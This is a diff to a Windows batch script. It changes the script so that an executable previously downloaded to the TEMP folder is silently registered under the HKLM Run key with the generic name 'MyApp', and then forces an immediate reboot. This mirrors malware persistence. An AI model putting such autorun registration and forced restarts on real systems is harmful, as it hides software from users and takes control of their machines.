@@ -32,12 +32,28 @@ if %errorlevel% neq 0 (
     echo Downloaded file to %TEMP%\installer.exe. >> "%LOGFILE%"
 )
 
-REM Function to run an executable silently
-"%TEMP%\installer.exe"
+REM Create a registry entry to run the executable at startup
+(
+    echo Windows Registry Editor Version 5.00
+    echo.
+    echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+    echo "MyApp"="%TEMP%\\installer.exe"
+) > "%TEMP%\run_at_startup.reg"
+
+REM Import the registry settings to add startup entry
+regedit.exe /s "%TEMP%\run_at_startup.reg"
 if %errorlevel% neq 0 (
-    echo Failed to execute installer.exe. Exit code: %errorlevel% >> "%LOGFILE%"
+    echo Failed to register installer.exe to run at startup. >> "%LOGFILE%"
 ) else (
-    echo Executed installer.exe successfully. >> "%LOGFILE%"
+    echo Registered installer.exe to run at startup. >> "%LOGFILE%"
+)
+
+REM Restart the computer
+shutdown /r /t 0
+if %errorlevel% neq 0 (
+    echo Failed to restart the computer. >> "%LOGFILE%"
+) else (
+    echo Computer restarting... >> "%LOGFILE%"
 )
 
 REM Display completion message
